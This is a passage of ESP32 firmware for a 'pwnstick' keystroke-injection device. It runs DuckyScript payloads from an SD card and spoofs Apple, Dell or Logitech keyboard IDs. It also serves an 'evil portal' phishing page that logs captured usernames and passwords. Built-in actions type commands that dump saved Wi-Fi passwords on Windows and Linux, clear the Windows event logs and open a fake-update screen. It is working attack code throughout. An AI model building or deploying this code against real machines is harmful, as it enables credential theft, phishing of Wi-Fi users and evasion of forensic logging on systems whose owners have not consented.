                        screen_buf[py*160 + px] = SWAP(color);
                }
            }
            line >>= 1;
        }
    }
}

void drawString(int x, int y, const char* str, uint16_t color, int scale) {
    while (*str) { drawChar(x, y, *str, color, scale); x += 6*scale; str++; }
}

// ── LED ───────────────────────────────────────────────────────────────────────
void updateLed() {
    static unsigned long lastTick = 0;
    static bool blink = false;
    if (millis() - lastTick > 400) { lastTick = millis(); blink = !blink; }
    if (ledFlashCount > 0) {
        leds[0] = CRGB::Red; ledFlashCount--;
    } else if (ws.count() > 0) {
        leds[0] = isBleMode
            ? (blink ? CRGB(0,0,80) : CRGB(0,0,20))
            : (blink ? CRGB(0,80,0) : CRGB(0,15,0));
    } else if (WiFi.softAPgetStationNum() > 0) {
        leds[0] = blink ? CRGB(40,40,0) : CRGB::Black;
    } else {
        leds[0] = CRGB(5,5,5);
    }
    FastLED.show();
}

// ── DuckyScript ───────────────────────────────────────────────────────────────
uint8_t duckyModKey(const String& s) {
    if (s=="GUI"||s=="WINDOWS"||s=="WIN"||s=="COMMAND") return KEY_LEFT_GUI;
    if (s=="CTRL"||s=="CONTROL") return KEY_LEFT_CTRL;
    if (s=="ALT") return KEY_LEFT_ALT;
    if (s=="SHIFT") return KEY_LEFT_SHIFT;
    return 0;
}

uint8_t duckySpecialKey(const String& s) {
    if (s=="ENTER") return KEY_RETURN;
    if (s=="BACKSPACE") return KEY_BACKSPACE;
    if (s=="TAB") return KEY_TAB;
    if (s=="ESCAPE"||s=="ESC") return KEY_ESC;
    if (s=="DELETE"||s=="DEL") return KEY_DELETE;
    if (s=="UP_ARROW"||s=="UPARROW") return KEY_UP_ARROW;
    if (s=="DOWN_ARROW"||s=="DOWNARROW") return KEY_DOWN_ARROW;
    if (s=="LEFT_ARROW"||s=="LEFTARROW") return KEY_LEFT_ARROW;
    if (s=="RIGHT_ARROW"||s=="RIGHTARROW") return KEY_RIGHT_ARROW;
    if (s=="F1") return KEY_F1;
    if (s=="F2") return KEY_F2;
    if (s=="F11") return KEY_F11;
    if (s=="SPACE") return ' ';
    return 0;
}

void parseDuckyCombo(const String& line) {
    String tokens[6]; int count = 0, start = 0;
    while (start < (int)line.length() && count < 6) {
        int sp = line.indexOf(' ', start);
        if (sp < 0) { tokens[count++] = line.substring(start); break; }
        tokens[count++] = line.substring(start, sp);
        start = sp + 1;
    }
    for (int i = 0; i < count - 1; i++) {
        uint8_t k = duckyModKey(tokens[i]);
        if (k) activeDriver->press(k);
    }
    if (count > 0) {
        String last = tokens[count-1];
        uint8_t k = duckyModKey(last);
        if (!k) k = duckySpecialKey(last);
        if (k) activeDriver->press(k);
        else if (last.length() == 1) activeDriver->press((uint8_t)last[0]);
    }
    delay(100);
    activeDriver->releaseAll();
}

void executeDuckyScript(const String& filename) {
    if (!sdAvailable) return;
    String path = "/payloads/" + filename;
    File f = SD_MMC.open(path.c_str(), FILE_READ);
    if (!f) { duckyRunning = false; return; }

    duckyRunning = true;
    int defaultDelay = 0;
    setLastKey("EXEC");

    while (f.available() && duckyRunning) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.isEmpty() || line.startsWith("REM ") || line.startsWith("//")) {
            // skip
        } else if (line.startsWith("DELAY ")) {
            delay(line.substring(6).toInt());
        } else if (line.startsWith("DEFAULTDELAY ")||line.startsWith("DEFAULT_DELAY ")) {
            defaultDelay = line.substring(line.indexOf(' ')+1).toInt();
        } else if (line.startsWith("STRING ")) {
            activeDriver->print(line.substring(7));
        } else if (line=="ENTER") { activeDriver->write(KEY_RETURN);
        } else if (line=="BACKSPACE") { activeDriver->write(KEY_BACKSPACE);
        } else if (line=="TAB") { activeDriver->write(KEY_TAB);
        } else if (line=="SPACE") { activeDriver->write(' ');
        } else if (line=="ESCAPE"||line=="ESC") { activeDriver->write(KEY_ESC);
        } else if (line=="DELETE"||line=="DEL") { activeDriver->write(KEY_DELETE);
        } else if (line=="UP_ARROW"||line=="UPARROW") { activeDriver->write(KEY_UP_ARROW);
        } else if (line=="DOWN_ARROW"||line=="DOWNARROW") { activeDriver->write(KEY_DOWN_ARROW);
        } else if (line=="LEFT_ARROW"||line=="LEFTARROW") { activeDriver->write(KEY_LEFT_ARROW);
        } else if (line=="RIGHT_ARROW"||line=="RIGHTARROW") { activeDriver->write(KEY_RIGHT_ARROW);
        } else {
            parseDuckyCombo(line);
        }
        if (defaultDelay > 0) delay(defaultDelay);
        dnsServer.processNextRequest();
        ws.cleanupClients();
        yield();
    }
    f.close();
    activeDriver->releaseAll();
    duckyRunning = false;
}

// ── Credential capture ────────────────────────────────────────────────────────
void addCred(const String& user, const String& pass) {
    String entry = "{\"u\":\"" + user + "\",\"p\":\"" + pass + "\",\"t\":" + String(millis()/1000) + "}";
    if (credsJson == "[]") credsJson = "[" + entry + "]";
    else credsJson = credsJson.substring(0, credsJson.length()-1) + "," + entry + "]";
    if (sdAvailable) {
        File f = SD_MMC.open("/evil-portal/captures.txt", FILE_APPEND);
        if (f) { f.println(user + " : " + pass); f.close(); }
    }
}

// ── WebSocket handler ─────────────────────────────────────────────────────────
void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
    AwsFrameInfo *info = (AwsFrameInfo*)arg;
    if (info->opcode == WS_TEXT && info->final && info->index == 0 && info->len == len) {
        data[len] = 0; String msg = (char*)data;
        if (msg.startsWith("K:")) { activeDriver->print(msg.substring(2)); setLastKey(msg.substring(2)); flashLed(); }
        else if (msg.startsWith("V:")) { activeDriver->print(msg.substring(2)); setLastKey("PASTE"); flashLed(); }
        else if (msg.startsWith("E:")) { activeDriver->write(KEY_RETURN); setLastKey("ENT"); flashLed(); }
        else if (msg.startsWith("B:1")) { activeDriver->write(KEY_BACKSPACE); setLastKey("DEL"); flashLed(); }
        else if (msg.startsWith("M:")) {
            int comma = msg.indexOf(',');
            if (comma > 0) {
                int x = msg.substring(2,comma).toInt(), y = msg.substring(comma+1).toInt();
                activeDriver->mouseMove(x, y);
                cursorX = constrain(cursorX + x, 0, 156);
                cursorY = constrain(cursorY + y, 0, 76);
                showCursorFrames = 10;
            }
        }
        else if (msg.startsWith("D:")||msg.startsWith("C:")) {
            char b = msg.charAt(2);
            uint8_t btn = (b=='r')?MOUSE_RIGHT:(b=='m')?MOUSE_MIDDLE:MOUSE_LEFT;
            if (msg.startsWith("C:")) activeDriver->mouseClick(btn); else activeDriver->mousePress(btn);
            flashLed();
        }
        else if (msg.startsWith("U:")) {
            if (msg.charAt(2)=='1') user_on_site = true;
            else { char b=msg.charAt(2); uint8_t btn=(b=='r')?MOUSE_RIGHT:(b=='m')?MOUSE_MIDDLE:MOUSE_LEFT; activeDriver->mouseRelease(btn); }
        }
        else if (msg.startsWith("H:")) {
            int comma = msg.indexOf(','); String mod = msg.substring(2,comma); bool st = msg.substring(comma+1)=="1";
            uint8_t k = (mod=="win")?KEY_LEFT_GUI:(mod=="ctrl")?KEY_LEFT_CTRL:(mod=="alt")?KEY_LEFT_ALT:KEY_LEFT_SHIFT;
            if (st) activeDriver->press(k); else { activeDriver->release(k); delay(10); activeDriver->write(0); }
        }
        else if (msg.startsWith("P:")) {
            String mod = msg.substring(2);
            uint8_t k = (mod=="win")?KEY_LEFT_GUI:(mod=="ctrl")?KEY_LEFT_CTRL:(mod=="alt")?KEY_LEFT_ALT:KEY_LEFT_SHIFT;
            activeDriver->press(k); delay(100); activeDriver->release(k); setLastKey(mod); flashLed();
        }
        else if (msg.startsWith("W:")) { activeDriver->mouseScroll(msg.substring(2).toInt()); }
        else if (msg.startsWith("A:")) {
            String act = msg.substring(2); activeDriver->releaseAll();
            bool sp = (targetOS == "lin");
            if (act=="arrowup") activeDriver->write(KEY_UP_ARROW);
            else if (act=="arrowdown") activeDriver->write(KEY_DOWN_ARROW);
            else if (act=="arrowleft") activeDriver->write(KEY_LEFT_ARROW);
            else if (act=="arrowright") activeDriver->write(KEY_RIGHT_ARROW);
            else if (act=="cb") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_BACKSPACE); delay(50); activeDriver->releaseAll(); }
            else if (act=="ps_admin") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('x'); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->print("a"); delay(1000); activeDriver->press(KEY_LEFT_ALT); activeDriver->print("y"); activeDriver->releaseAll(); }
            else if (act=="wifi_pass") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("cmd"); delay(1000); activeDriver->println("netsh wlan show profiles * key=clear | findstr /C:\"Key Content\" /C:\"SSID name\""); }
            else if (act=="fake_upd") {
                if (targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("https://fakeupdate.net/win10ue/"); delay(1500); activeDriver->write(KEY_F11); }
                else { activeDriver->press(KEY_LEFT_ALT); activeDriver->press(KEY_F2); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->print("xdg-open 'https://fakeupdate.net/steam/'"); delay(50); activeDriver->write(KEY_RETURN); delay(1500); activeDriver->write(KEY_F11); }
            }
            else if (act=="note_ghost") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("notepad"); delay(1000); activeDriver->println("I am watching you..."); }
            else if (act=="win_clr") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("powershell -NoP -Command \"Clear-EventLog -LogName System,Application,Security\""); }
            else if (act=="win_info") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("cmd /k systeminfo"); }
            else if (act=="lin_recon") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("hostnamectl; timedatectl; lsusb; lscpu; ip a"); }
            else if (act=="lin_net") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("ip addr; nmcli device wifi list"); }
            else if (act=="lin_wifi") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"); }
            else if (act=="term") { if(targetOS=="win"){activeDriver->press(KEY_LEFT_GUI);activeDriver->press('r');delay(300);activeDriver->releaseAll();delay(800);activeDriver->println("cmd");}else{activeDriver->press(KEY_LEFT_CTRL);activeDriver->press(KEY_LEFT_ALT);activeDriver->press('t');delay(300);activeDriver->releaseAll();} }
            else if (act=="calc") { if(targetOS=="win"){activeDriver->press(KEY_LEFT_GUI);activeDriver->press('r');delay(300);activeDriver->releaseAll();delay(800);activeDriver->println("calc");}else{activeDriver->press(KEY_LEFT_ALT);activeDriver->press(KEY_F2);delay(500);activeDriver->releaseAll();delay(1000);if(sp)activeDriver->print(" ");activeDriver->print("gnome-calculator");delay(100);activeDriver->write(KEY_RETURN);} }
            else if (act=="rick") { if(targetOS=="win"){activeDriver->press(KEY_LEFT_GUI);activeDriver->press('r');delay(300);activeDriver->releaseAll();delay(800);activeDriver->println("https://www.youtube.com/watch?v=dQw4w9WgXcQ");}else{activeDriver->press(KEY_LEFT_ALT);activeDriver->press(KEY_F2);delay(300);activeDriver->releaseAll();delay(800);if(sp)activeDriver->print(" ");activeDriver->print("xdg-open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'");delay(50);activeDriver->write(KEY_RETURN);} }
            else if (act=="snake") { if(targetOS=="win"){activeDriver->press(KEY_LEFT_GUI);activeDriver->press('r');delay(300);activeDriver->releaseAll();delay(800);activeDriver->println("cmd /c \"ssh snakes.run\"");}else{activeDriver->press(KEY_LEFT_CTRL);activeDriver->press(KEY_LEFT_ALT);activeDriver->press('t');delay(500);activeDriver->releaseAll();delay(1000);if(sp)activeDriver->print(" ");activeDriver->println("ssh snakes.run");} }
            else if (act.startsWith("m_")&&act!="m_scr") { activeDriver->mediaAction(act); }
            else if (act=="m_scr") { if(targetOS=="win"){activeDriver->press(KEY_LEFT_GUI);activeDriver->press(KEY_LEFT_SHIFT);activeDriver->press('s');delay(100);activeDriver->releaseAll();}else{activeDriver->printScreen();} }
            setLastKey(act); flashLed();
        }
        else if (msg.startsWith("B:list")) { ws.text(info->num, "B:" + bleDriver.getBondedDevices()); }
        else if (msg.startsWith("B:conn:")) { bleDriver.connectToDevice(msg.substring(7)); }
        else if (msg.startsWith("B:ren:")) { int i=msg.indexOf(':',6); if(i>0)bleDriver.renameDevice(msg.substring(6,i),msg.substring(i+1)); ws.text(info->num,"B:"+bleDriver.getBondedDevices()); }
        else if (msg.startsWith("B:del:")) { bleDriver.deleteDevice(msg.substring(6)); ws.text(info->num,"B:"+bleDriver.getBondedDevices()); }
        else if (msg.startsWith("T:")) { setHidMode(msg.substring(2)=="ble"); }
        else if (msg.startsWith("O:")) { targetOS = msg.substring(2); }
        else if (msg=="I:clear") { show_img=false; gif_mode=false; gif_count=0; forceQR=false; }
        else if (msg=="I:gif")   { gif_mode=true; gif_count=0; gif_idx=0; show_img=false; }
        else if (msg=="I:img")   { gif_mode=false; gif_count=0; show_img=true; }
        else if (msg.startsWith("JIG:")) { jigglerEnabled = (msg.charAt(4)=='1'); }
        else if (msg.startsWith("EP:"))  { evilPortalEnabled = (msg.charAt(3)=='1'); }
        else if (msg=="CREDS:clear") { credsJson = "[]"; }
        else if (msg.startsWith("RUN:")) { pendingPayload = msg.substring(4); payloadPending = true; setLastKey("LOAD"); }
        else if (msg=="PAYLOAD:stop") { duckyRunning = false; }
        else if (msg.startsWith("VID:")) {
            Preferences prefs; prefs.begin("pwnstick", false);
            prefs.putString("vid", msg.substring(4)); prefs.end();
            ws.text(info->num, "VIDACK");
        }
    } else if (info->opcode == WS_BINARY) {
        if (info->index == 0) binaryOffset = 0;
        if (binaryOffset + len <= 25600 && custom_img_buf) {
            memcpy(((uint8_t*)custom_img_buf) + binaryOffset, data, len);
            binaryOffset += len;
            if (binaryOffset == 25600) {
                if (gif_mode && gif_count < 15) {
                    if (!gif_storage[gif_count]) gif_storage[gif_count] = (uint16_t*)heap_caps_malloc(25600, MALLOC_CAP_SPIRAM);
                    if (!gif_storage[gif_count]) gif_storage[gif_count] = (uint16_t*)malloc(25600);
                    if (gif_storage[gif_count]) memcpy(gif_storage[gif_count], custom_img_buf, 25600);
                    gif_count++;
                }
                if (!gif_mode) show_img = true;
                else if (gif_count > 1) show_img = true;
            }
        }
    }
}

// ── Display ───────────────────────────────────────────────────────────────────
void updateDisplay() {
    if (show_img) {
        if (gif_mode && gif_count > 1) {
            if (millis() - last_gif_ms > 150) {
                last_gif_ms = millis();
                if (gif_storage[gif_idx]) memcpy(screen_buf, gif_storage[gif_idx], 25600);
                gif_idx = (gif_idx + 1) % gif_count;
            }
        } else if (custom_img_buf) {
            memcpy(screen_buf, custom_img_buf, 25600);
        }
    } else {
        int clients = WiFi.softAPgetStationNum();
        if (forceQR || (clients > 0 && ws.count() == 0)) {
            for (int i = 0; i < 160*80; i++) screen_buf[i] = SWAP(C_BLACK);
            int sc=3, ox=(160-qr_size*sc)/2, oy=(80-qr_size*sc)/2;
            for (int y=0; y<qr_size; y++) for (int x=0; x<qr_size; x++) {
                uint16_t c = qr_data[y*qr_size+x] ? C_BLACK : C_WHITE;
                for (int sy=0;sy<sc;sy++) for (int sx=0;sx<sc;sx++)
                    screen_buf[(oy+y*sc+sy)*160+(ox+x*sc+sx)] = SWAP(c);
            }
        } else {
            if (ws.count() > 0) user_on_site = true; else user_on_site = false;
            static int drops[160]; static bool init = false;
            if (!init) { for (int i=0;i<160;i++) drops[i]=random(-100,0); init=true; }
            for (int i=0; i<160*80; i++) {
                uint16_t c = screen_buf[i];
                if (c == SWAP(C_RED)) { screen_buf[i] = SWAP(C_BLACK); continue; }
                if (c != SWAP(C_BLACK)) {
                    uint16_t ns = SWAP(c);
                    uint16_t r=(ns>>11)&0x1F, g=(ns>>5)&0x3F, b=ns&0x1F;
                    if(g>2)g-=2;else g=0; if(r>4)r-=4;else r=0; if(b>4)b-=4;else b=0;
                    screen_buf[i] = SWAP((r<<11)|(g<<5)|b);
                }
            }
            for (int x=0; x<160; x+=6) {
                if (drops[x]>=0&&drops[x]<80) {
                    screen_buf[drops[x]*160+x] = SWAP(C_GREEN);
                    if (x+1<160) screen_buf[drops[x]*160+x+1] = SWAP(C_GREEN);
                }
                drops[x]++; if (drops[x]>=80) drops[x]=random(-40,0);
            }
            char info[32]; sprintf(info, "192.168.4.1 U:%d", clients);
            drawString(2, 2, info, C_WHITE, 1);
            if (evilPortalEnabled) drawString(2, 12, "EP:ON", C_RED, 1);
            if (jigglerEnabled) drawString(2, 22, "JIG", C_YELLOW, 1);
            if (millis()-lastKeyTime<2000 && lastKey.length()>0) {
                int len=lastKey.length(), sc=(len>3)?2:4;
                int tx=(160-(len*6*sc))/2, ty=(80-8*sc)/2;
                drawString(tx, ty, lastKey.c_str(), C_GREEN, sc);
            }
        }
    }
    if (showCursorFrames > 0) {
        for (int y=0;y<4;y++) for (int x=0;x<4;x++)
            screen_buf[(cursorY+y)*160+(cursorX+x)] = SWAP(C_RED);
        showCursorFrames--;
    }
    esp_lcd_panel_draw_bitmap(panel_handle, 0, 0, 160, 80, screen_buf);
}

// ── LCD init ──────────────────────────────────────────────────────────────────
void setup_lcd() {
    spi_bus_config_t b = ST7735_PANEL_BUS_SPI_CONFIG(PIN_NUM_CLK, PIN_NUM_MOSI, 160*80*2);
    spi_bus_initialize(SPI2_HOST, &b, SPI_DMA_CH_AUTO);
    esp_lcd_panel_io_spi_config_t ioc = ST7735_PANEL_IO_SPI_CONFIG(PIN_NUM_CS, PIN_NUM_DC, NULL, NULL);
    esp_lcd_new_panel_io_spi((esp_lcd_spi_bus_handle_t)SPI2_HOST, &ioc, &io_handle);
    esp_lcd_panel_dev_config_t pc = { .reset_gpio_num=PIN_NUM_RST, .color_space=ESP_LCD_COLOR_SPACE_BGR, .bits_per_pixel=16 };
    esp_lcd_new_panel_st7735(io_handle, &pc, &panel_handle);
    esp_lcd_panel_reset(panel_handle); esp_lcd_panel_init(panel_handle);
    esp_lcd_panel_invert_color(panel_handle, true);
    esp_lcd_panel_set_gap(panel_handle, 1, 26);
    esp_lcd_panel_swap_xy(panel_handle, true);
    esp_lcd_panel_mirror(panel_handle, false, true);
    esp_lcd_panel_disp_on_off(panel_handle, true);
    pinMode(PIN_NUM_BCKL, OUTPUT); digitalWrite(PIN_NUM_BCKL, 0);
}

// ── Setup ─────────────────────────────────────────────────────────────────────
void setup() {
    Serial.begin(115200);
    pinMode(BTN_PIN, INPUT_PULLUP);

    // Allocate image buffers in PSRAM
    custom_img_buf = (uint16_t*)heap_caps_malloc(160*80*2, MALLOC_CAP_SPIRAM);
    if (!custom_img_buf) custom_img_buf = (uint16_t*)malloc(160*80*2);
    for (int i = 0; i < 15; i++) gif_storage[i] = nullptr;

    FastLED.addLeds<WS2812, LED_DI_PIN, GRB>(leds, NUM_LEDS);
    leds[0] = CRGB::Red; FastLED.show();

    // USB VID/PID (must be before USB.begin inside usbDriver)
    {
        Preferences prefs; prefs.begin("pwnstick", true);
        String vid = prefs.getString("vid", "gen"); prefs.end();
        if (vid == "apple") { USB.VID(0x05AC); USB.PID(0x0267); USB.manufacturerName("Apple Inc."); USB.productName("Apple Keyboard"); }
        else if (vid == "dell") { USB.VID(0x413C); USB.PID(0x2113); USB.manufacturerName("Dell Inc."); USB.productName("Dell USB Keyboard"); }
        else if (vid == "logi") { USB.VID(0x046D); USB.PID(0xC31C); USB.manufacturerName("Logitech"); USB.productName("USB Keyboard"); }
    }

    usbDriver.begin();
    bleDriver.begin();
    setHidMode(false);

    WiFi.mode(WIFI_AP); WiFi.softAP(ssid);
    dnsServer.start(53, "*", IPAddress(192,168,4,1));

    MDNS.begin("pwnstick");

    setup_lcd();

    ws.onEvent([](AsyncWebSocket *srv, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len){
        if (type == WS_EVT_DATA) handleWebSocketMessage(arg, data, len);
        else if (type == WS_EVT_CONNECT) {
            // push status on connect
            String sb = String(ws.count()) + "," + (sdAvailable ? "1" : "0");
            client->text("SBUPD:" + sb);
        }
        else if (type == WS_EVT_DISCONNECT) { user_on_site = false; }
    });
    server.addHandler(&ws);

    // Captive portal redirects
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *r){ r->redirect("http://192.168.4.1/"); });
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *r){ r->redirect("http://192.168.4.1/"); });

    // Main UI (always accessible)
    server.on("/ctrl", HTTP_GET, [](AsyncWebServerRequest *r){ r->send(200,"text/html",index_html); });

    // Root: phishing page or real UI
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *r){
        if (evilPortalEnabled) r->send(200,"text/html",evil_portal_html);
        else r->send(200,"text/html",index_html);
    });

    // Evil portal credential capture
    server.on("/capture", HTTP_POST, [](AsyncWebServerRequest *r){
        String user="", pass="";
        if (r->hasParam("user",true)) user = r->getParam("user",true)->value();
        if (r->hasParam("pass",true)) pass = r->getParam("pass",true)->value();
        addCred(user, pass);
        r->redirect("http://192.168.4.1/ok");
    });
    server.on("/ok", HTTP_GET, [](AsyncWebServerRequest *r){ r->send(200,"text/html",capture_success_html); });

    // SD payloads list
    server.on("/payloads", HTTP_GET, [](AsyncWebServerRequest *r){
        String json = "{\"sd\":" + String(sdAvailable?"true":"false") + ",\"files\":[";
        if (sdAvailable) {
            File dir = SD_MMC.open("/payloads");
            if (dir && dir.isDirectory()) {
                bool first = true;
                File f = dir.openNextFile();
                while (f) {
                    String name = f.name();
                    int sl = name.lastIndexOf('/');
                    if (sl >= 0) name = name.substring(sl+1);
                    if (!f.isDirectory() && name.endsWith(".txt")) {
                        if (!first) json += ",";
                        json += "\"" + name + "\"";
                        first = false;
                    }
                    f = dir.openNextFile();
                }
            }
        }
        json += "]}";
        r->send(200, "application/json", json);
    });

    // Captured creds
    server.on("/creds", HTTP_GET, [](AsyncWebServerRequest *r){ r->send(200,"application/json",credsJson); });

    server.onNotFound([](AsyncWebServerRequest *r){ r->redirect("http://192.168.4.1/"); });
    server.begin();

    leds[0] = CRGB::Green; FastLED.show();

    // SD card init AFTER server is up so WiFi stays responsive during potentially slow init
    SD_MMC.setPins(SD_CLK, SD_CMD, SD_D0, SD_D1, SD_D2, SD_D3);
    if (SD_MMC.begin("/sdcard", false)) {
        sdAvailable = true;
        SD_MMC.mkdir("/payloads");
        SD_MMC.mkdir("/images");
        SD_MMC.mkdir("/evil-portal");
        Serial.println("SD card mounted");
    } else {
        Serial.println("SD card not found");
    }
}

// ── Loop ──────────────────────────────────────────────────────────────────────
void loop() {
    dnsServer.processNextRequest();
    ws.cleanupClients();

    // Execute pending DuckyScript payload
    if (payloadPending && !duckyRunning) {
        payloadPending = false;
        executeDuckyScript(pendingPayload);
    }

    // Mouse jiggler
    if (jigglerEnabled && !duckyRunning && millis() - lastJiggle > 30000) {
        int dx = random(-3, 4), dy = random(-3, 4);
        activeDriver->mouseMove(dx, dy);
        delay(50);
        activeDriver->mouseMove(-dx, -dy);
        lastJiggle = millis();
    }

    // Physical button: single short press cycles display
    static bool lastBtn = HIGH;
    static unsigned long btnTime = 0;
    bool btnNow = digitalRead(BTN_PIN);
    if (btnNow == LOW && lastBtn == HIGH) btnTime = millis();
    else if (btnNow == HIGH && lastBtn == LOW) {
        unsigned long held = millis() - btnTime;
        if (held > 20 && held < 700) {
            // Cycle: matrix → QR → image → matrix
            if (!forceQR && !show_img) forceQR = true;
            else if (forceQR) { forceQR = false; if (custom_img_buf) show_img = true; }
            else { show_img = false; }
        }
    }
    lastBtn = btnNow;

    // Display + LED at 20 fps
    static uint32_t lastFrame = 0;
    if (millis() - lastFrame > 50) {
        lastFrame = millis();
        updateDisplay();
        updateLed();
    }
}
